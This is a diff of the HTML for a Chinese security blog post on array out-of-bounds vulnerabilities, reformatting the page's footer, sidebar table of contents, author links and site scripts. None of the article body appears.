+  <p><span>原始链接: </span><a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html" title="二进制-数组越界漏洞"><a href="https://www.leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html" title="二进制-数组越界漏洞">https://www.leeyuxun.github.io/二进制-数组越界漏洞.html</a></a></p>
+  <p><span>许可协议: </span>本博客所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"> <i class="fab fa-creative-commons"></i>BY-NC-SA </a>许可协议，转载请注明出处！</p>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/" rel="tag"><i class="fa fa-tag"></i> 数组越界</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/gcc%E7%BC%96%E8%AF%91%E4%B8%AD%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%9A%84%E5%85%B3%E9%97%AD%E5%92%8C%E5%BC%80%E5%90%AF.html" rel="prev" title="gcc编译中保护机制的关闭和开启">
+      <i class="fa fa-chevron-left"></i> gcc编译中保护机制的关闭和开启
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.html" rel="next" title="二进制-格式化字符串漏洞">
+      二进制-格式化字符串漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
     let { activeClass } = CONFIG.comments;
     if (CONFIG.comments.storage) {
       activeClass = localStorage.getItem('comments_active') || activeClass;
@@ -16,7 +439,169 @@
       let commentClass = event.target.classList[1];
       localStorage.setItem('comments_active', commentClass);
     });
-  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#数组的原理"><span class="nav-number">1.1.</span> <span class="nav-text">数组的原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞原理"><span class="nav-number">2.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞源码"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">3.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用思路"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造ROP劫持程序流"><span class="nav-number">3.4.</span> <span class="nav-text">构造ROP劫持程序流</span></a></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="李钰璕" src="/images/avatar.png"><p class="site-author-name" itemprop="name">李钰璕</p><div class="site-description" itemprop="description">从0开始学习网络安全</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">75</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">105</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a> </span><span class="links-of-author-item"><a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a></span></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></footer></div><script src="/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/local-search.js"></script><script>if (typeof MathJax === 'undefined') {
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#数组的原理"><span class="nav-number">1.1.</span> <span class="nav-text">数组的原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞原理"><span class="nav-number">2.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞源码"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">3.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用思路"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造ROP劫持程序流"><span class="nav-number">3.4.</span> <span class="nav-text">构造ROP劫持程序流</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">从0开始学习网络安全</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">105</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!---
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>--->
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
     window.MathJax = {
       loader: {
           load: ['[tex]/mhchem'],
@@ -64,4 +649,12 @@
     MathJax.startup.document.state(0);
     MathJax.texReset();
     MathJax.typeset();
-  }</script></body></html>
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
